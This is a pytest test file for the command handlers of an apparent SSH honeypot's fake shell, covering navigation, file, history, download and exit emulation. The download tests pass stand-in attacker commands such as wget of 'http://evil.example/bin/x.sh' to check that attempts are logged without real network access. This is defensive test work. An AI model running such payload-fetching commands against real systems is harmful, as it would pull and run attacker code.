"""Unit tests for Ghost Shell command handlers.

Handlers are called directly with a ``SessionContext`` built from the real
``fs_template.yaml``.

Sections:
  1. Shared fixtures / helpers
  2. Navigation and info commands (pwd, cd, ls, whoami, id, uname, hostname, echo)
  3. Files / history / download / exit commands (added by task 8.5)
"""

from __future__ import annotations

import socket
from datetime import UTC, datetime
from pathlib import Path

import pytest

from trap.config import Config
from trap.ghost.commands.download import curl, wget
from trap.ghost.commands.exit_ import SessionExitRequested, exit_command
from trap.ghost.commands.files import cat, chmod, mkdir, rm, touch
from trap.ghost.commands.history import history
from trap.ghost.commands.info import KERNEL_RELEASE, echo, hostname, id_, uname, whoami
from trap.ghost.commands.navigation import cd, ls, pwd
from trap.ghost.dispatcher import CommandResult
from trap.ghost.filesystem import FakeFilesystem, load_template
from trap.models import Session, SessionContext

TEMPLATE_PATH = Path(__file__).resolve().parent.parent / "trap" / "ghost" / "fs_template.yaml"

# ---------------------------------------------------------------------------
# 1. Shared fixtures / helpers
# ---------------------------------------------------------------------------


def make_ctx(tmp_path: Path, username: str = "root") -> SessionContext:
    config = Config(
        trap_port=2222,
        host_key_path=tmp_path / "key",
        credential_file=tmp_path / "creds.txt",
        log_dir=tmp_path / "logs",
        idle_timeout_seconds=300,
        max_session_seconds=1800,
        max_input_line=4096,
        accept_after_attempts=None,
        llm_backend="scripted",
        llm_api_url=None,
    )
    session = Session(
        session_id="abc123",
        src_ip="203.0.113.5",
        src_port=40000,
        username=username,
        password="pw",
        client_version="SSH-2.0-test",
        started_at=datetime.now(UTC),
    )
    fs = FakeFilesystem(load_template(TEMPLATE_PATH))
    return SessionContext(session=session, fs=fs, history=[], config=config)


@pytest.fixture
def ctx(tmp_path: Path) -> SessionContext:
    return make_ctx(tmp_path)


# ---------------------------------------------------------------------------
# 2. Navigation and info commands
# ---------------------------------------------------------------------------


class TestPwd:
    async def test_root_directory(self, ctx: SessionContext) -> None:
        result = await pwd([], ctx)
        assert result.output == "/"
        assert not result.is_error

    async def test_after_cd(self, ctx: SessionContext) -> None:
        await cd(["/etc"], ctx)
        assert (await pwd([], ctx)).output == "/etc"


class TestCd:
    async def test_absolute_path(self, ctx: SessionContext) -> None:
        result = await cd(["/var/log"], ctx)
        assert result == type(result)(output="", is_error=False)
        assert ctx.fs.cwd_path() == "/var/log"

    async def test_relative_and_parent(self, ctx: SessionContext) -> None:
        await cd(["/var"], ctx)
        await cd(["log"], ctx)
        assert ctx.fs.cwd_path() == "/var/log"
        await cd([".."], ctx)
        assert ctx.fs.cwd_path() == "/var"

    async def test_no_args_goes_to_root_home(self, ctx: SessionContext) -> None:
        await cd(["/tmp"], ctx)
        await cd([], ctx)
        assert ctx.fs.cwd_path() == "/root"

    async def test_no_args_goes_to_user_home(self, tmp_path: Path) -> None:
        user_ctx = make_ctx(tmp_path, username="caretaker")
        await cd([], user_ctx)
        assert user_ctx.fs.cwd_path() == "/home/caretaker"

    async def test_tilde(self, ctx: SessionContext) -> None:
        await cd(["/tmp"], ctx)
        await cd(["~"], ctx)
        assert ctx.fs.cwd_path() == "/root"

    async def test_missing_path_errors_and_keeps_cwd(self, ctx: SessionContext) -> None:
        await cd(["/etc"], ctx)
        result = await cd(["/nope"], ctx)
        assert result.is_error
        assert result.output == "bash: cd: /nope: No such file or directory"
        assert ctx.fs.cwd_path() == "/etc"

    async def test_file_target_errors_and_keeps_cwd(self, ctx: SessionContext) -> None:
        result = await cd(["/etc/hostname"], ctx)
        assert result.is_error
        assert "Not a directory" in result.output
        assert ctx.fs.cwd_path() == "/"


class TestLs:
    async def test_plain_lists_space_separated_names(self, ctx: SessionContext) -> None:
        result = await ls([], ctx)
        assert not result.is_error
        names = result.output.split()
        for expected in ("etc", "root", "home", "vault", "var", "tmp"):
            assert expected in names
        assert "\n" not in result.output

    async def test_path_argument(self, ctx: SessionContext) -> None:
        result = await ls(["/home/caretaker"], ctx)
        assert result.output == "last_words.txt"

    async def test_empty_directory(self, ctx: SessionContext) -> None:
        assert (await ls(["/vault"], ctx)).output == ""

    async def test_la_has_all_columns(self, ctx: SessionContext) -> None:
        result = await ls(["-la", "/home/caretaker"], ctx)
        assert not result.is_error
        lines = result.output.splitlines()
        assert lines[0].startswith("total ")
        fields = lines[1].split()
        # permissions, link count, owner, group, size, mtime (3 tokens), name
        assert fields[0] == "-rw-r--r--"
        assert fields[2] == "caretaker"
        node = ctx.fs.resolve("/home/caretaker/last_words.txt")
        assert node is not None
        assert fields[4] == str(node.size)
        assert node.mtime in lines[1]
        assert fields[-1] == "last_words.txt"

    async def test_l_shows_directory_permissions(self, ctx: SessionContext) -> None:
        result = await ls(["-l", "/"], ctx)
        vault_line = next(ln for ln in result.output.splitlines() if ln.endswith(" vault"))
        assert vault_line.startswith("drwx------")

    async def test_missing_path_errors(self, ctx: SessionContext) -> None:
        result = await ls(["/nope"], ctx)
        assert result.is_error
        assert result.output == "ls: cannot access '/nope': No such file or directory"


class TestWhoami:
    async def test_returns_username(self, tmp_path: Path) -> None:
        for name in ("root", "admin"):
            assert (await whoami([], make_ctx(tmp_path, name))).output == name


class TestId:
    async def test_root(self, ctx: SessionContext) -> None:
        assert (await id_([], ctx)).output == "uid=0(root) gid=0(root) groups=0(root)"

    async def test_non_root(self, tmp_path: Path) -> None:
        result = await id_([], make_ctx(tmp_path, "admin"))
        assert result.output == "uid=1000(admin) gid=1000(admin) groups=1000(admin)"
        assert not result.is_error


class TestUname:
    async def test_dash_a(self, ctx: SessionContext) -> None:
        output = (await uname(["-a"], ctx)).output
        assert output.startswith("Linux records-srv-09 2.6.18-92.el5 #1 SMP")
        assert output.endswith("GNU/Linux")

    async def test_no_flags(self, ctx: SessionContext) -> None:
        assert (await uname([], ctx)).output == "Linux"

    async def test_dash_r(self, ctx: SessionContext) -> None:
        assert (await uname(["-r"], ctx)).output == KERNEL_RELEASE


class TestHostname:
    async def test_returns_fixed_name(self, ctx: SessionContext) -> None:
        assert (await hostname([], ctx)).output == "records-srv-09"


class TestEcho:
    async def test_no_args(self, ctx: SessionContext) -> None:
        assert (await echo([], ctx)).output == ""

    async def test_single_arg(self, ctx: SessionContext) -> None:
        assert (await echo(["hello"], ctx)).output == "hello"

    async def test_multiple_args_joined_by_single_space(self, ctx: SessionContext) -> None:
        assert (await echo(["a", "b", "c"], ctx)).output == "a b c"

    async def test_no_variable_expansion(self, ctx: SessionContext) -> None:
        assert (await echo(["$PATH"], ctx)).output == "$PATH"
        assert (await echo(["$HOME", "$(id)"], ctx)).output == "$HOME $(id)"


# ---------------------------------------------------------------------------
# 3. Files / history / download / exit commands  (task 8.5 appends here)
# ---------------------------------------------------------------------------

class TestCat:
    async def test_existing_file(self, ctx: SessionContext) -> None:
        result = await cat(["/etc/hostname"], ctx)
        assert not result.is_error
        assert result.output == ctx.fs.cat("/etc/hostname").rstrip("\n")
        assert result.output != ""

    async def test_missing_file(self, ctx: SessionContext) -> None:
        result = await cat(["/nope"], ctx)
        assert result.is_error
        assert result.output == "cat: /nope: No such file or directory"

    async def test_directory(self, ctx: SessionContext) -> None:
        result = await cat(["/etc"], ctx)
        assert result.is_error
        assert result.output == "cat: /etc: Is a directory"

    async def test_multiple_files_mixed(self, ctx: SessionContext) -> None:
        result = await cat(["/etc/hostname", "/nope"], ctx)
        assert result.is_error
        assert result.output.splitlines()[-1] == "cat: /nope: No such file or directory"


class TestTouch:
    async def test_creates_file(self, ctx: SessionContext) -> None:
        result = await touch(["/tmp/a.txt"], ctx)
        assert result == CommandResult(output="", is_error=False)
        node = ctx.fs.resolve("/tmp/a.txt")
        assert node is not None

    async def test_missing_operand(self, ctx: SessionContext) -> None:
        result = await touch([], ctx)
        assert result.is_error
        assert result.output == "touch: missing file operand"

    async def test_missing_parent(self, ctx: SessionContext) -> None:
        result = await touch(["/nope/a"], ctx)
        assert result.is_error
        assert "No such file or directory" in result.output


class TestMkdir:
    async def test_creates_directory(self, ctx: SessionContext) -> None:
        result = await mkdir(["/tmp/d"], ctx)
        assert not result.is_error
        node = ctx.fs.resolve("/tmp/d")
        assert node is not None
        assert node.is_dir

    async def test_existing_errors(self, ctx: SessionContext) -> None:
        result = await mkdir(["/tmp"], ctx)
        assert result.is_error
        assert result.output == "mkdir: cannot create directory '/tmp': File exists"

    async def test_existing_with_p_is_silent(self, ctx: SessionContext) -> None:
        assert not (await mkdir(["-p", "/tmp"], ctx)).is_error

    async def test_missing_parent(self, ctx: SessionContext) -> None:
        result = await mkdir(["/nope/x"], ctx)
        assert result.is_error
        assert "No such file or directory" in result.output

    async def test_missing_operand(self, ctx: SessionContext) -> None:
        result = await mkdir([], ctx)
        assert result.is_error
        assert result.output == "mkdir: missing operand"


class TestRm:
    async def test_removes_file(self, ctx: SessionContext) -> None:
        await touch(["/tmp/a"], ctx)
        result = await rm(["/tmp/a"], ctx)
        assert not result.is_error
        assert ctx.fs.resolve("/tmp/a") is None

    async def test_missing_file(self, ctx: SessionContext) -> None:
        result = await rm(["/tmp/nope"], ctx)
        assert result.is_error
        assert result.output == "rm: cannot remove '/tmp/nope': No such file or directory"

    async def test_force_suppresses_missing(self, ctx: SessionContext) -> None:
        result = await rm(["-f", "/tmp/nope"], ctx)
        assert result == CommandResult(output="", is_error=False)

    async def test_directory_needs_recursive(self, ctx: SessionContext) -> None:
        await mkdir(["/tmp/d"], ctx)
        result = await rm(["/tmp/d"], ctx)
        assert result.is_error
        assert "Is a directory" in result.output
        assert ctx.fs.resolve("/tmp/d") is not None
        assert not (await rm(["-rf", "/tmp/d"], ctx)).is_error
        assert ctx.fs.resolve("/tmp/d") is None

    async def test_missing_operand(self, ctx: SessionContext) -> None:
        result = await rm([], ctx)
        assert result.is_error
        assert result.output == "rm: missing operand"


class TestChmod:
    async def test_octal_mode_changes_permissions(self, ctx: SessionContext) -> None:
        await touch(["/tmp/a"], ctx)
        result = await chmod(["755", "/tmp/a"], ctx)
        assert not result.is_error
        node = ctx.fs.resolve("/tmp/a")
        assert node is not None
        assert node.permissions == "-rwxr-xr-x"

    async def test_symbolic_mode(self, ctx: SessionContext) -> None:
        await touch(["/tmp/a"], ctx)
        assert not (await chmod(["+x", "/tmp/a"], ctx)).is_error
        node = ctx.fs.resolve("/tmp/a")
        assert node is not None
        assert "x" in node.permissions

    async def test_missing_file(self, ctx: SessionContext) -> None:
        result = await chmod(["755", "/nope"], ctx)
        assert result.is_error
        assert result.output == "chmod: cannot access '/nope': No such file or directory"

    async def test_invalid_mode(self, ctx: SessionContext) -> None:
        await touch(["/tmp/a"], ctx)
        result = await chmod(["zzz", "/tmp/a"], ctx)
        assert result.is_error
        assert result.output == "chmod: invalid mode: 'zzz'"

    async def test_missing_operand(self, ctx: SessionContext) -> None:
        assert (await chmod([], ctx)).output == "chmod: missing operand"


class TestHistory:
    async def test_empty(self, ctx: SessionContext) -> None:
        result = await history([], ctx)
        assert result == CommandResult(output="", is_error=False)

    async def test_numbered_from_one_in_order(self, ctx: SessionContext) -> None:
        ctx.history.extend(["ls", "whoami", "history"])
        lines = (await history([], ctx)).output.splitlines()
        assert [ln.split(maxsplit=1) for ln in lines] == [
            ["1", "ls"],
            ["2", "whoami"],
            ["3", "history"],
        ]


@pytest.fixture
def no_network(monkeypatch: pytest.MonkeyPatch) -> list[object]:
    """Make any socket connection attempt fail the test; returns attempts."""
    attempts: list[object] = []
    real_connect = socket.socket.connect
    real_connect_ex = socket.socket.connect_ex

    def _is_loopback(address: object) -> bool:
        # The Windows asyncio loop connects a loopback socketpair for itself;
        # that is not the handler touching the network.
        return isinstance(address, tuple) and address[:1] == ("127.0.0.1",)

    def _blocked(self: socket.socket, address: object) -> None:
        if _is_loopback(address):
            real_connect(self, address)  # type: ignore[arg-type]
            return
        attempts.append(address)
        raise AssertionError(f"network touched: {address!r}")

    def _blocked_ex(self: socket.socket, address: object) -> int:
        if _is_loopback(address):
            return real_connect_ex(self, address)  # type: ignore[arg-type]
        attempts.append(address)
        raise AssertionError(f"network touched: {address!r}")

    monkeypatch.setattr(socket.socket, "connect", _blocked)
    monkeypatch.setattr(socket.socket, "connect_ex", _blocked_ex)

    def _no_resolve(*_a: object, **_k: object) -> None:
        raise AssertionError("DNS lookup attempted")

    monkeypatch.setattr(socket, "getaddrinfo", _no_resolve)
    return attempts


class TestDownload:
    async def test_wget_records_event_and_file(
        self, ctx: SessionContext, no_network: list[object]
    ) -> None:
        url = "http://evil.example/bin/x.sh"
        result = await wget([url], ctx)
        assert not result.is_error
        assert "x.sh" in result.output
        assert len(ctx.pending_events) == 1
        event = ctx.pending_events[0]
        assert event.kind == "download_attempt"
        assert event.session_id == "abc123"
        assert event.payload["url"] == url
        assert event.payload["command"] == f"wget {url}"
        assert event.generated_by == "scripted"
        assert ctx.downloaded_files == {"x.sh"}
        assert ctx.fs.resolve("x.sh") is not None
        assert no_network == []

    async def test_wget_output_option_names_file(
        self, ctx: SessionContext, no_network: list[object]
    ) -> None:
        await wget(["-O", "/tmp/payload", "http://evil.example/a"], ctx)
        assert ctx.downloaded_files == {"payload"}
        assert ctx.pending_events[0].payload["url"] == "http://evil.example/a"
        assert no_network == []

    async def test_wget_without_url(self, ctx: SessionContext) -> None:
        result = await wget([], ctx)
        assert result.is_error
        assert "missing URL" in result.output
        assert ctx.pending_events == []
        assert ctx.downloaded_files == set()

    async def test_curl_stdout_records_event_without_file(
        self, ctx: SessionContext, no_network: list[object]
    ) -> None:
        result = await curl(["http://evil.example/x"], ctx)
        assert not result.is_error
        assert [e.kind for e in ctx.pending_events] == ["download_attempt"]
        assert ctx.pending_events[0].payload["url"] == "http://evil.example/x"
        assert ctx.downloaded_files == set()
        assert no_network == []

    async def test_curl_dash_o_saves_file(
        self, ctx: SessionContext, no_network: list[object]
    ) -> None:
        await curl(["-o", "out.bin", "http://evil.example/x"], ctx)
        assert ctx.downloaded_files == {"out.bin"}
        assert ctx.fs.resolve("out.bin") is not None
        assert len(ctx.pending_events) == 1
        assert no_network == []

    async def test_curl_without_url(self, ctx: SessionContext) -> None:
        result = await curl([], ctx)
        assert result.is_error
        assert ctx.pending_events == []

    async def test_unparseable_url_still_no_network(
        self, ctx: SessionContext, no_network: list[object]
    ) -> None:
        await wget(["http://[::1"], ctx)
        assert no_network == []


class TestExit:
    async def test_raises_session_exit_requested(self, ctx: SessionContext) -> None:
        with pytest.raises(SessionExitRequested):
            await exit_command([], ctx)

    async def test_raises_with_args(self, ctx: SessionContext) -> None:
        with pytest.raises(SessionExitRequested):
            await exit_command(["1"], ctx)
